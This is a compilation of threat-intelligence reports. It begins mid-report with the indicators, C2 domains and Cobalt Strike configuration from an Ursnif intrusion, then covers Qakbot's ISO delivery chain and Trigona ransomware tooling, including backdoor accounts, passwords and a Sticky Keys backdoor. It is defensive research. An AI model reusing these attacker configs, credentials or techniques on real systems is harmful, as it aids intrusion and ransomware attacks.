193.106.191.186 3db94cf953886aeb630f1ae616a2ec25 cook32.rar d99cc31f3415a1337e57b8289ac5011e cook64.rar a1f634f177f73f112b5356b8ee04ad19 stilak32.rar 8ea6ad3b1acb9e7b2e64d08411af3c9a stilak64.rar 0c5862717f00f28473c39b9cba2953f4 vnc32.rar ce77f575cc4406b76c68475cb3693e14 vnc64.rar JoeSandbox reported this sample having the following configuration: { "RSA Public Key": "WzgHg0uTPZvhLtnG19qpIk+GmHzcoxkfTefSu6gst5n3mxnOBivzR4MH4a6Ax7hZ5fgcuPGt3NKKPbYTwmknjD2zYXaAp3+wR0kAZI+LVG1CUiDgK2lhHKV91eobjLR/Z/RtHa+MZM10+zZoBGCk+VjMy7gWkzoCrrhs6/Bft/lYT9NzAGBQ4ZZgJTkXW4tVgEQiGmoc7Ta1/NqrbaQBEciYTW7E4egMKHQeGNrjd94u5PZha7GgX7aseTe7/68QIz2hc7Xl2gtUGQYYVqKgGpKjKrQT5jpYbcjLE+VoRjcWucFAPAfIryWH1A4T+PbO5+eHGGCIM/fAuYU/58JZn0HUmtKm9wHYCUJ/uGotKAI=", "c2_domain": [ "superliner.top", "superlinez.top", "internetlined.com", "internetlines.in", "medialists.su", "medialists.ru", "mediawagi.info", "mediawagi.ru", "5.42.199.83", "denterdrigx.com", "и", "digserchx.at" ], "ip_check_url": [ "http://ipinfo.io/ip", "http://curlmyip.net" ], "serpent_key": "Jv1GYc8A8hCBIeVD", "tor32_dll": "file://c:\\test\\test32.dll", "tor64_dll": "file://c:\\test\\tor64.dll", "server": "50", "sleep_time": "1", "SetWaitableTimer_value(CRC_CONFIGTIMEOUT)": "60", "time_value": "60", "SetWaitableTimer_value(CRC_TASKTIMEOUT)": "60", "SetWaitableTimer_value(CRC_SENDTIMEOUT)": "300", "SetWaitableTimer_value(CRC_KNOCKERTIMEOUT)": "60", "not_use(CRC_BCTIMEOUT)": "10", "botnet": "3000", "SetWaitableTimer_value": "1" } Pivoting on domains registered in WHOIS with the email [email protected] or organization Rus Lak, reveals many similar domains as seen in this intrusion. 
Cobalt Strike The following Cobalt Strike C2 server was observed: 193.201.9.199:443 JA3:
72a589da586844d7f0818ce684948eea JA3s: f176ba63b4d68e576b5ba345bec2c7b7 Certificate: [6e:ce:5e:ce:41:92:68:3d:2d:84:e2:5b:0b:a7:e0:4f:9c:b7:eb:7c] Not Before: 2015/05/20 18:26:24 UTC Not After: 2025/05/17 18:26:24 UTC Issuer Org: Subject Common: Subject Org: 
Public Algorithm: rsaEncryption The following Cobalt Strike configuration was observed: { "spawnto": "AAAAAAAAAAAAAAAAAAAAAA==", "pipename": null, "dns_beacon": { "put_metadata": null, "get_TXT": null, "get_AAAA": null, "get_A": null, "beacon": null, "maxdns": null, "dns_sleep": null, "put_output": null, "dns_idle": null }, "smb_frame_header": "AAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=", "post_ex": { "spawnto_x64": "%windir%\\sysnative\\rundll32.exe", "spawnto_x86": "%windir%\\syswow64\\rundll32.exe" }, "stage": { "cleanup": "false" }, "process_inject": { "stub": "IiuPJ9vfuo3dVZ7son6mSA==", "transform_x64": [], "transform_x86": [], "startrwx": "true", "min_alloc": "0", "userwx": "true", "execute": [ "CreateThread", "SetThreadContext", "CreateRemoteThread", "RtlCreateUserThread" ], "allocator": "VirtualAllocEx" }, "uses_cookies": "true", "http_post_chunk": "0", "ssh": { "privatekey": null, "username": null, "password": null, "port": null, "hostname": null }, "useragent_header": null, "maxgetsize": "1048576", "proxy": { "behavior": "Use IE settings", "password": null, "username": null, "type": null }, "tcp_frame_header": "AAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=", "server": { "publickey": "MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCnCZHWnYFqYB/6gJdkc4MPDTtBJ20nkEAd3tsY4tPKs8MV4yIjJb5CtlrbKHjzP1oD/1AQsj6EKlEMFIKtakLx5+VybrMYE+dDdkDteHmVX0AeFyw001FyQVlt1B+OSNPRscKI5sh1L/ZdwnrMy6S6nNbQ5N5hls6k2kgNO5nQ7QIDAQABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==", "port": "443", "hostname": "193.201.9.199" }, "beacontype": [ "HTTPS" ], "kill_date": null, "license_id": "1580103824", "jitter": "0", "sleeptime": "60000", "http_get": { "server": { "output": [ "print" ] }, "client": { "metadata": [], "headers": [] }, "verb": "GET", "uri": "/__utm.gif" }, "cfg_caution": "false", "host_header": "", "crypto_scheme": "0", "http_post": { "client": { "output": [], "id": [], "headers": [] }, "verb": "POST", "uri": "/submit.php" } } Checking the certificate used, reveals that it is a default SSL certificate for Cobalt Strike, 83cd09b0f73c909bfc14883163a649e1d207df22. Atera & SplashTop Even though the threat actor installed these agents, we did not observe any activity with these tools. 
Exfiltration Several HTTP Post events were observed to the identified domains denterdrigx[.]com, superliner[.]top and 5.42.199[.]83, masquerading as image uploads. 
The user agent ‘Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 10.0; Win64; x64)’, an unusual browser configuration to masquerade as, which indicates use of Internet Explorer 8.0 (that was released ~2009). 
The POST event included a MIME part indicating file upload activity 
The example HTTP stream containing the content The file that was uploaded 775E.bin was deleted by the injected ‘Explorer.exe’ process from the target endpoint in folder ‘\Users\<REDACTED>\AppData\Local\Temp’ 
The exfiltration activity along with the beacon activity can be detected using the following network signatures: ET MALWARE Ursnif Variant CnC Data Exfil and ET MALWARE Ursnif Variant CnC Beacon.
In this example, the mix of activity can be observed as: Impact The threat actor was able to RDP to a backup server using the admin credentials they acquired.
Using the logs in Microsoft-Windows-TerminalServices-LocalSessionManager/Operational we were able to determine the threat actor spent approximately 10 minutes on the backup server before disconnecting their RDP session.
By doing this, they revealed the workstation name of the client: WIN-RRRU9REOK18. 
LogName=Security EventCode=4624 EventType=0 ComputerName=<REDACTED> SourceName=Microsoft Windows security auditing. 
Type=Information RecordNumber=300297 Keywords=Audit Success TaskCategory=Logon OpCode=Info Message=An account was successfully logged on. 
Logon Information: Logon Type: 3 Restricted Admin Mode: - Virtual Account: No Elevated Token: 
Yes Network Information: Workstation Name: WIN-RRRU9REOK18 Source Network Address: <REDACTED> Source Port: 0 Detailed Authentication Information: 
Logon Process: NtLmSsp Authentication Package: NTLM Transited Services: - Package Name (NTLM only): NTLM V2 During that time, the threat actor undertook a number of hands-on keyboard actions; this included reviewing backups in a backup console, checking on running tasks, and using notepad to paste in the following content. 
Process execution: C:\Program Files\[redacted]\Console\[redacted].exe "C:\Windows\system32\taskmgr.exe" /4 "C:\Windows\system32\NOTEPAD.EXE" C:\Users\USER\Desktop\New
Text Document.txt Sysmon Copy Paste Collection EID 24: user: DOMAIN\USER ip: 127.0.0.1 hostname: WIN-RRRU9REOK18 Indicators Atomic RDP Client Name: WIN-RRRU9REOK18 Ursnif Domains: denterdrigx.com superliner.top internetlines.in superstarts.top superlinez.top internetlined.com Ursnif IPs: 62.173.149.7 31.41.44.97 5.42.199.83 31.41.44.27 208.91.197.91 187.190.48.135 210.92.250.133 189.143.170.233 201.103.222.246 151.251.24.5 190.147.189.122 115.88.24.202 211.40.39.251 187.195.146.2 186.182.55.44 222.232.238.243 211.119.84.111 
51.211.212.188 203.91.116.53 115.88.24.203 190.117.75.91 181.197.121.228 190.167.61.79 109.102.255.230 211.119.84.112 190.107.133.19 185.95.186.58 175.120.254.9 46.194.108.30 190.225.159.63 190.140.74.43 187.156.56.52 195.158.3.162 138.36.3.134 109.98.58.98 24.232.210.245 222.236.49.123 175.126.109.15 124.109.61.160 95.107.163.44 93.152.141.65 5.204.145.65 116.121.62.237 31.166.129.162 222.236.49.124 211.171.233.129 211.171.233.126 211.53.230.67 196.200.111.5 190.219.54.242 190.167.100.154 110.14.121.125 58.235.189.192 37.34.248.24 110.14.121.123 179.53.93.16 175.119.10.231 211.59.14.90 188.48.64.249 187.232.150.225 186.7.85.71 148.255.20.4 91.139.196.113 41.41.255.235 31.167.236.174 189.165.2.131 1.248.122.240 193.106.191.186 Cobalt Strike: 193.201.9.1 Computed 123.com d0432468fa4b7f66166c430e1334dbda f72d978f4d1ca1c435b1164e7617464cc06a9381 7d99c80a1249a1ec9af0f3047c855778b06ea57e11943a271071985afe09e6c2 3488164.iso f7d85c971e9604cc6d2a2ffcac1ee4a3 67175143196c17f10776bdf5fbf832e50a646824 e999890ce5eb5b456563650145308ae837d940e38aec50d2f02670671d472b99 6570872.lnk c6b605a120e0d3f3cbd146bdbc358834 328afa8338d60202d55191912eea6151f80956d3 16323b3e56a0cbbba742b8d0af8519f53a78c13f9b3473352fcce2d28660cb37 adcomp.bat eb2335e887875619b24b9c48396d4d48 b658ab9ac2453cde5ca82be667040ac94bfcbe2e 4aa4ee8efcf68441808d0055c26a24e5b8f32de89c6a7a0d9b742cce588213ed alsoOne.bat c03f5e2bc4f2307f6ee68675d2026c82 4ce65da98f0fd0fc4372b97b3e6f8fbeec32deb3 6a9b7c289d7338760dd38d42a9e61d155ae906c14e80a1fed2ec62a4327a4f71 canWell.js 6bb867e53c46aa55a3ae92e425c6df91 6d4f1a9658baccd2e406454b2ad40ca2353916ab 5b51bd2518ad4b9353898ed329f1b2b60f72142f90cd7e37ee42579ee1b645be firefox.exe 6a4356bd2b70f7bd4a3a1f0e0bfec9a4 485a179756ff9586587f8728e173e7df83b1ffc3 6c5338d84c208b37a4ec5e13baf6e1906bd9669e18006530bf541e1d466ba819 itsIt.db 60375d64a9a496e220b6eb1b63e899b3 d1b2dd93026b83672118940df78a41e2ee02be80 8e570e32acb99abfd0daf62cff13a09eb694ebfa633a365d224aefc6449f97de or.jpg 60ca7723edd4f3a0561ea9d3a42f82b4 87b699122dacf3235303a48c74fa2b7a75397c6b bbcceb987c01024d596c28712e429571f5758f67ba12ccfcae197aadb8ab8051 cook32.rar 3db94cf953886aeb630f1ae616a2ec25 743128253f1df9e0b8ee296cfec17e5fc614f98d 1cdbf7c8a45b753bb5c2ea1c9fb2e53377d07a3c84eb29a1b15cdc140837f654 cook64.rar d99cc31f3415a1337e57b8289ac5011e f67ce90f66f6721c3eea30581334457d6da23aac b94810947c33a0a0dcd79743a8db049b8e45e73ca25c9bfbf4bfed364715791b stilak32.rar a1f634f177f73f112b5356b8ee04ad19 7c82b558a691834caf978621f288af0449400e03 c77ea4ad228ecad750fb7d4404adc06d7a28dbb6a5e0cf1448c694d692598f4f stilak64.rar 8ea6ad3b1acb9e7b2e64d08411af3c9a 7c04c4567b77981d0d97d8c2eb4ebd1a24053f48 dfdfd0a339fe03549b2475811b106866d035954e9bc002f20b0f69e0f986838f vnc32.rar 0c5862717f00f28473c39b9cba2953f4 25832c23319fcfe92cde3d443cc731ac056a964a 7ebd70819a79be55d4c92c66e74e90e3309ec977934920aee22cd8d922808c9d vnc64.rar ce77f575cc4406b76c68475cb3693e14 80fdc4712ae450cfa41a37a24ce0129eff469fb7 f02dc60872f5a9c2fcc9beb05294b57ad8a4a9cef0161ebe008 Detections Network Potential Impacket wmiexec.py activity ET MALWARE Ursnif Variant CnC Beacon ET MALWARE Ursnif Variant CnC Beacon - URI Struct M2 (_2F) ET INFO HTTP Request to a *.top domain ET DNS Query to a *.top domain - Likely Hostile ET MALWARE Ursnif Variant CnC Data Exfil ET INFO Dotted Quad Host RAR Request ET MALWARE Meterpreter or Other Reverse Shell SSL Cert ET HUNTING Suspicious Empty SSL Certificate - Observed in Cobalt Strike ET POLICY RDP connection confirm ET POLICY MS Remote Desktop Administrator Login Request ET MALWARE Ursnif Variant CnC Beacon 3 ET MALWARE Ursnif Payload Request (cook32.rar) ET MALWARE Ursnif Payload Request (cook64.rar) ET INFO Splashtop Domain (splashtop .com)
in TLS SNI ET INFO Splashtop Domain in DNS Lookup (splashtop .com) 
Sigma Yara MITRE Mshta - T1218.005 Visual Basic - T1059.005 Compile After Delivery - T1027.004 BITS Jobs - T1197 Credentials from Password Stores - T1555 LSASS Memory - T1003.001 System Information Discovery - T1082 Process Discovery - T1057 Domain Trust Discovery - T1482 Mark-of-the-Web Bypass - T1553.005 Malicious File - T1204.002 System Time Discovery - T1124 System Owner/User Discovery - T1033 Remote System Discovery - T1018 
Remote Desktop Protocol - T1021.001 Windows Management Instrumentation - T1047 Domain Account - T1087.002 Process Injection - T1055 Asynchronous Procedure Call - T1055.004 Registry Run Keys / Startup Folder - T1547.001 Remote Access Software - T1219 Web Protocols - T1071.001 Lateral Tool Transfer - T1570 Exfiltration Over C2 Channel - T1041 Internal case #17386 
title: Qakbot Returns to ISO Delivery (For Now) url: https://www.esentire.com/blog/qakbot-returns-to-iso-delivery-for-now Adversaries don’t work 9-5 and neither do we.
At eSentire, our 24/7 SOCs are staffed with Elite Threat Hunters and Cyber Analysts who hunt, investigate, contain and respond to threats within minutes. 
We have discovered some of the most dangerous threats and nation state attacks in our space – including the Kaseya MSP breach and the more_eggs malware. 
Our Security Operations Centers are supported with Threat Intelligence, Tactical Threat Response and Advanced Threat Analytics driven by our Threat Response Unit – the TRU team. 
In TRU Positives, eSentire’s Threat Response Unit (TRU) provides a summary of a recent threat investigation.
We outline how we responded to the confirmed threat and what recommendations we have going forward. 
Here’s the latest from our TRU Team… What did we find? 
In early February 2023, we reported that multiple threat groups were leveraging OneNote files for malware delivery.
Qakbot was one such threat group and made up the majority of our observations of malicious OneNote files during this period. 
Since mid-February, observations of Qakbot delivery via OneNote has faded in our telemetry while use of ISO image files has returned.
The absence of OneNote malware in our telemetry suggests the technique is finding less success in circumventing perimeter gateways and content filters.
The diminished use of OneNote by Qakbot during the week of February 20th is corroborated by public mentions (1, 2, 3) of ISO images in lieu of the aforementioned file type. 
However, it’s unlikely OneNote has been completely abandoned and it remains probable that threat actors will continue to iterate on the technique to extend its shelf life. 
Qakbot’s infection scheme, as observed on February 22, 2023, is summarized below and in Figure 1. 
A victim is sent an email linking to an externally hosted Zip file. 
The Zip contains an ISO image file.
The victim double clicks the ISO to mount it (1).
The mounted file contains a hidden folder (4), a 200+MB padded file and a visible shortcut file disguised as a zip. 
The shortcut file (2) executes a CMD file (3) when clicked. 
The CMD file contains commands which use certutil (renamed here as slaughterhouse.exe) to decode Qakbot’s DLL (brainstorms.sql).
This file is base64 twice, thus requires two rounds of decoding using certutil.
The decoded DLL is then executed using rundll32 and injects Qakbot into wermgr.exe. 
Figure 1 Summary of Qakbot's infection chain as seen on February 22, 2023. 
How did we find it? MDR for Endpoint identified the ISO shortcut and certutil behavior. 
What did we do? 
Our team of 24/7 SOC Cyber Analysts triaged the case, isolated the host and alerted the customer. 
What can you learn from this TRU positive? 
OneNote quickly gained traction and was adopted by several threat groups (including Qakbot) in January and early February 2023.
As mentioned in our previous TRU Positive, it’s probable detection of this filetype has improved.
It’s unlikely that the OneNote filetype has been abandoned, and continued vigilance and blocking at perimeter gateways is recommended.
ISO image files have shown to be a viable vehicle for malware delivery and execution since emerging as a popular alternative to macro-enabled documents in early 2022.
ISO images can be mounted natively with a click of a button, displaying as a folder to the end user.
Victims can be lured into clicking executable content including binaries, scripts or shortcut files masquerading as benign filetypes such as PDFs or folders.
The use of ISO images has seen some iterative improvements throughout the last year by threats such as Qakbot.
This includes encapsulating the image in one or more filetypes (Zips, PDFs, HTML), padding the contents with benign data or chaining together a series of scripts to decode or unpack the final payload.
In this case, the Qakbot Zip and ISO image were retrieved by the victim using a link included in an email.
It included a standalone file padded with over 200MB of blank spaces, likely to impede analysis of the decompressed ISO file. 
Recommendations from our Threat Response Unit (TRU) Team: Audit and consider blocking OneNote (.one), ISO images (.iso), Disk Image Files (.img) and Virtual Hard Disk files (.vhd and .vhdx) on perimeter gateways.
Protect endpoints against malware by:Ensuring antivirus signatures are up-to-date.
Using a Next-Gen AV (NGAV) or Endpoint Detection and Response (EDR) tool to detect and contain threats.
Train users to identify and report potentially malicious content using an Phishing and Security Awareness Training (PSAT) program.
Users should specifically be aware of the threat of OneNote documents for malware delivery. 
Indicator Note rtpbolamas88[.]com Qakbot Payload 92.97.203.51 Qakbot C2 90.78.138.217 90.104.22.28 86.99.54.39 86.225.214.138 86.202.48.142 82.127.204.82 81.229.117.95 80.47.57.131 80.13.205.69 72.203.216.98 71.212.147.224 67.10.175.47 49.245.82.178 217.165.1.53 213.67.255.57 190.75.95.164 184.176.35.223 149.74.159.67 109.11.175.42 107.146.12.26 103.140.174.19 eSentire’s Threat Response Unit (TRU) is a world-class team of threat researchers who develop new detections enriched by original threat intelligence and leverage new machine learning models that correlate multi-signal data and automate rapid response to advanced threats. 
If you are not currently engaged with an MDR provider, eSentire MDR can help you reclaim the advantage and put your business ahead of disruption. 
Learn what it means to have an elite team of Threat Hunters and Researchers that works for you.
Connect with an eSentire Security Specialist. 
title: Bee-Ware of Trigona, An Emerging Ransomware Strain url: https://unit42.paloaltonetworks.com/trigona-ransomware-update/ This post is also available in: 日本語 (Japanese)Executive Summary Trigona ransomware is a relatively new strain that security researchers first discovered in late October 2022.
By analyzing Trigona ransomware binaries and ransom notes obtained from VirusTotal, as well as information from Unit 42 incident response, we determined that Trigona was very active during December 2022, with at least 15 potential victims being compromised.
Affected organizations are in the manufacturing, finance, construction, agriculture, marketing and high technology industries. 
Unit 42 researchers identified two new Trigona ransom notes in January 2023 and two in February 2023.
Trigona’s ransom notes are unique; rather than the usual text file, they are instead presented in an HTML Application with embedded JavaScript containing unique computer IDs (CID) and victim IDs (VID). 
Palo Alto Networks helps detect and prevent Trigona ransomware with the following products and services: Cortex XDR, Prisma Cloud and Next-Generation Firewalls (including cloud-delivered security subscriptions such as WildFire) and through incident response. 
Table of Contents Trigona OverviewRansomware AnalysisRansomware BinaryRansom NoteVictimologyLeak Site AnalysisSimilarities to CryLock RansomwareTools and TechniquesTTPsConclusionIndicators of CompromiseAdditional ResourcesProduct Protection Guide Trigona Overview The first mention of Trigona, also the name of a family of stingless bees, comes from a tweet by security researchers in late October 2022.
Malware samples were passed to BleepingComputer, which in turn published a blog post on the ransomware on Nov. 29, 2022.
Unit 42 consultants also have seen Trigona firsthand in the course of incident response. 
Unit 42 researchers have observed Trigona’s threat operator engaging in behavior such as obtaining initial access to a target’s environment, conducting reconnaissance, transferring malware via remote monitoring and management (RMM) software, creating new user accounts and deploying ransomware. 
Ransomware Analysis Ransomware Binary Unit 42 obtained and analyzed a sample of the Trigona ransomware binary, named svhost.exe.
Upon execution, the ransomware binary uses TDCP_rijndael (a Delphi AES library) to encrypt files.
The ransomware then appends the ._locked file extension, modifies registry keys to maintain persistence, and drops ransom notes. 
The ransomware binary supports the following command line arguments: Argument Description /full Performs all functions of the ransomware.
Encrypts both local and network files.
Creates two registry keys for persistence, one for the ransomware binary and another for the ransom note. 
/!autorun Skips creation of registry keys for persistence /test_cid “test” Overwrites default victim generated CID and replace with “test” value /test_vid “test” Overwrites default VID and replace with “test” value /p, /path
“path” Encrypts only files contained within specified path /!local Does not encrypt local system files, only encrypts files on local network /!lan Does not encrypt local network files, only encrypts files on local system /autorun_only “path” Creates registry key for persistence only.
Allows for optional “path” to be provided to override default path, does not encrypt files The ransomware establishes persistence through the creation of two keys in CurrentVersion\Run.
Keys found in CurrentVersion\Run contain references to programs that will execute when a user logs in. 
One key executes the ransomware binary whenever the user logs in, ensuring that the encryption process would resume upon reboot.
The other key ensures that the ransom note is opened every time the user logs in. 
Ransom Note Trigona’s ransom note is dropped to the system with the name how_to_decrypt.hta.
The HTML code in this file contains embedded JavaScript functionality, which displays ransom note details as shown below in Figure 1. 
Figure 1.
Sample Trigona ransom note.
Unit 42 researchers observed that the JavaScript within the ransom note contains the following information: A uniquely generated CID and VID A link to the negotiation Tor portal An email address to contact. 
The contact email shown below in Figure 2 is phandaledr@onionmail[.]org.
We have also seen farusbig@tutanota[.]com used as the contact email in other Trigona ransom notes. 
Figure 2. Embedded JavaScript containing campaign ID and victim ID.Victimology By looking at the victim ID in the embedded JavaScript in the Trigona ransom notes, we were able to identify at least 15 potential victims that were compromised in December 2022.
We also identified two new Trigona ransom notes in January 2023 and two in February 2023. 
Trigona ransomware has been linked to compromises impacting multiple organizations worldwide, in sectors including manufacturing, finance, construction, agriculture, marketing and high technology.
The companies impacted were in the United States, Italy, France, Germany, Australia and New Zealand. 
Leak Site Analysis When Trigona was first observed, there was no evidence of this group using a leak site for double extortion.
Their ransom note pointed the victims to their negotiation portal instead.
During the investigation of this ransomware family, we observed that a researcher identified a leak site attributed to Trigona hosted on the IP address 45.227.253[.]99. 
Unit 42 researchers pivoted on the SSH key for 45.227.253[.]99 and identified three other IP addresses related to Trigona’s infrastructure: 45.227.253[.]106 45.227.253[.]98 45.227.253[.]107 Each IP shares the same SSH key of ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMjqeyIfJyuimtE414TBCxN+lHleN5/P3CNiD4uln5xyHjyw4muLePQj2y3yOJ7GLlTvjrheWlrot3REko99eKQ=. IPs 45.227.253[.]99 and 45.227.253[.]106 hosted web servers on port 8000, while 45.227.253[.]98 and 45.227.253[.]107 hosted no web services. 
We identified that 45.227.253[.]99 hosted a web server between Dec. 6, 2022, and Jan. 27, 2023.
On Feb. 13, 2023, 45.227.253[.]106 started hosting a web server with the HTML title Trigona Leaks that was active until March 3, 2023. 
As shown in Figure 3, each post contained the following information: A description of the company The victim’s ZoomInfo page A description of the stolen data Links to screenshots of example files A countdown timer A button to bid for the data. 
The “@ Place a bid” button contained a mailto link to auction@mailthink[.]net.
Mailthink is a service that allows users to create temporary, disposable email addresses. 
Figure 3.
Trigona leak site.
While the leak site was active, there were four victims: Victim 1 has a near-duplicate post on the BlackCat (ALPHV) leak site and a countdown timer of over 300 days.
Security researchers at Arete Incident Response recently observed Trigona leveraging BlackCat’s reputation and data leak site to pressure and extort victims.
It’s unclear whether Victim 1 was impacted by Trigona. 
Victim 2 has a duplicate post on the BlackCat (ALPHV) leak site and a countdown timer of over 300 days.
It’s unclear whether Victim 2 was impacted by Trigona. 
Victim 3 has an associated ransom note on VirusTotal and a countdown timer of just over 30 days.
Unit 42 assesses with high confidence that Victim 3 was impacted by Trigona. 
Victim 4 is not mentioned on any other ransomware gang’s leak site and has a countdown timer of over 300 days.
Unit 42 did not identify any associated ransom notes and it’s unclear whether Victim 4 was impacted by Trigona. 
The countdown timers of over 300 days for Victims 1, 2 and 4 were well beyond the usual timeframe that we have observed in incident response cases where attackers demand payment, which is between two and four weeks. 
Given the following features, the Unit 42 team believes with moderate confidence that the surface web leak page was a development environment to test out features before a possible move to the dark web: Several posts appear to be duplicates from the BlackCat leak site (as shown in Figure 4) 
Several of the countdown timers are considerably longer 
The leak site is no longer available on the surface web Figure 4.
Comparison between Trigona leak site (left) and BlackCat (ALPHV) leak site (right).Similarities to CryLock Ransomware Trigona operators share overlap in tactics, techniques and procedures (TTPs) with CryLock ransomware operators, suggesting that ransomware threat actors that once deployed CryLock ransomware might have moved on to deploying Trigona ransomware.
The email associated with Trigona ransom notes analyzed by Unit 42 (phandaledr@onionmail[.]org) was mentioned in an online forum discussing CryLock ransomware, as shown below in Figure 5. Figure 5.
A user on SafeZone, a Russian anti-malware forum, seeking help for Crylock ransomware.
Both ransomware families also drop ransom notes in HTML Application format, named how_to_decrypt.hta.
There are also similarities in the ransom message, including: Their claim that all “documents, databases, backups, and other critical” files and data were encrypted AES as their choice of cryptographic algorithm Their statement that “the price depends on how soon you will contact us” Tools and Techniques Unit 42 has seen evidence of malicious activity associated with Trigona originating from a compromised Windows 2003 server, followed by the threat operators executing NetScan for internal reconnaissance. 
NetScan Unit 42 analysts recovered the NetScan output and noticed that it contained Cyrillic characters, as shown below in Figure 6.
Changing the default language of NetScan to Russian is an option that can be configured upon initial installation. 
Figure 6.
NetScan output that operator(s) left on disk containing Cyrillic characters.
After conducting reconnaissance, Trigona operators used Splashtop – a remote access and management (RMM) tool – to transfer the following malware into the target’s environment. 
Threat actors often abuse, take advantage of or subvert legitimate products for malicious purposes.
This does not necessarily imply a flaw or malicious quality to the legitimate product being abused. 
Start.bat Start.bat is a batch script that performs the following activities: It creates a new folder at C:\temp It copies other malicious batch and EXE files from a compromised internal Server Message Block (SMB) server to the newly created temp folder It executes Turnoff.bat Turnoff.bat Turnoff.bat is a cleanup script used to remove evidence of the attack on a system.
It does so by performing the following activities: Clearing the Recycle Bin of any mounted drive Attempting to use sc stop and taskkill to stop over 100 services related to various areas ranging from remote desktop tools to Windows Defender Attempting to stop services related to VMware, Hyper-V and SQL Ending several running tasks related to the stopped services mentioned above Clear Windows Event Logs (using wevutil cl) 
Deleting Volume Shadow Copies Disconnecting all network drives Unit
42 researchers have observed that cleanup scripts from other threat actors are usually smaller and more specific to the tools used by that actor.
The scattershot variety of services and tasks that turnoff.bat stops could suggest that the tool is attempting to ensure that a wider variety of systems are encrypted. 
Newuser.bat Newuser.bat is a batch script that creates a new user with the name fredla and the password Qw123456.
It then adds the fredla user to the local groups Administrator and Remote Desktop Users.
Threat actors sometimes create privileged user accounts to keep access to target systems without having to install persistent remote access tools on the system. 
DC2.exe DC2.exe contains a password protected version of Mimikatz, which is a tool used for extracting sensitive information such as passwords and authentication credentials from a Windows operating system. 
This version of Mimikatz has been compressed using UPX.
While UPX is often legitimately used to reduce file size, we have observed threat actors utilizing UPX and other packing programs to evade static detection of the underlying payload. 
The tool is also password protected, which adds an extra layer of complexity when ascertaining the program’s functionality. 
When the executable is run, the threat actor is prompted for a password to continue.
The MD5 hash of the password is then calculated, and if it is equal to 4dbf44c6b1be736ee92ef90090452fc2, the program will continue running. 
The password required to achieve the MD5 hash is boris. 
Among its many legitimate uses, Unit 42 researchers have most often observed Mimikatz being leveraged maliciously by threat actors in the following ways: Credential Loading Mimikatz loads credentials from various sources such as Windows memory, Local Security Authority Subsystem Service (LSASS) process and the Windows registry. 
Credential Dumping The tool then extracts and dumps the credentials, including usernames and passwords, hashes, and Kerberos tickets to the screen or to a file. 
Credential Manipulation Mimikatz allows the user to manipulate the dumped credentials, such as changing passwords, creating new user accounts and adding users to groups. 
Credential Injection The tool can also inject the manipulated credentials into other processes, allowing the user to impersonate another user and gain access to restricted resources. 
DC4.exe DC4.exe is a small, UPX-packed password protected binary that generates and executes an embedded batch file.
Like DC2.exe, the password to allow the binary to run is boris. 
Upon execution, the batch file makes the following changes to the system: Disables the User Account Control (UAC) and sets cmd.exe as a debugger for HelpPane.exe, utilman.exe, Magnify.exe and sethc.exe.
This is a common method of creating a “Sticky Keys backdoor” that allows for the creation of a command prompt with NT AUTHORITY\SYSTEM privileges. 
Opens specific ports on the firewall to allow remote desktop connections using the netsh command. 
Modifies the Windows registry to allow remote desktop connections. 
Creates a new user account with the username sys and password Mm1518061+-, and adds this user to the Administrator and Remote Desktop Users groups. 
DC6.exe DC6.exe is an installer for the publicly available tool Advanced Port Scanner, wrapped up in an Inno Setup installer package.
Inno Setup is a free software installer for Windows programs.
Advanced Port Scanner is a tool that is commonly abused by threat actors for network scanning and mapping, for lateral movement and discovery purposes. 
Wrapping Advanced Port Scanner in Inno Setup adds an additional layer of obfuscation to the code, and it is likely to evade static signature detection, forcing dynamic analysis to determine functionality rather than relying on traditional static code signatures. 
TTPs Tactic / Technique Notes TA0002 Execution T1072.
Software Deployment Tools Trigona operators use Splashtop to move laterally and transfer malware between compromised hosts in the victim’s environment. 
TA0003 Persistence T1546.008.
Accessibility Features DC4.exe creates a batch script that, when executed, creates a “Sticky Keys backdoor” that allows for creation of a command prompt with NT AUTHORITY\SYSTEM privileges. T1136.
Create Account Newuser.bat creates a new user with the username fredla and password Qw123456. 
T1098.
Account Manipulation Trigona operators compromise administrator accounts and use them to conduct malicious activities, such as executing NetScan. 
TA0005 Defense Evasion T1027.
Obfuscated Files or Information Trigona operators use UPX to pack DC2.exe and DC4.exe to avoid static signature detection.
For DC6.exe, Trigona hid the installer for Advanced Port Scanner within Inno Setup installer to evade static signature detection. T1112.
Modify Registry DC4.exe creates a batch script that, when executed, modifies the Windows Registry to allow remote desktop connections. 
T1562.004.
Disable or Modify System Firewall Trigona operators open up an Remote Desktop Protocol (RDP) port in the firewall with DC4.exe. T1070.001.
Indicator Removal: Clear Windows Event Logs Trigona operators use turnoff.bat to clear event logs via wevtutil cl. T1070.004.
Indicator Removal: File Deletion Trigona operators delete files such as mim.exe, mim32.exe, zam.exe and zam.bat to cover their tracks.
Mim32.exe is associated with Mimikatz while zam.exe and zam.bat are associated with NetScan. 
T1036.004.
Masquerade Task or Service Trigona’s ransomware binary was named svhost.exe to mimic the legitimate Windows binary svchost.exe. 
TA0006 Credential Access T1555.
Credentials from Password Stores Trigona operators use Mimikatz to dump passwords. T1003.001.
OS Credential Duping: LSASS Memory Trigona operators use Mimikatz to dump passwords from LSASS. 
TA0007 Discovery T1046.
Network Service Discovery Trigona operators use NetScan to enumerate hosts within victims’ domains that might be vulnerable to remote software exploitation. T1069.
Permission Groups Discovery Trigona operators use NetScan to enumerate the security-enabled local group membership of the Administrators group. T1021.001.
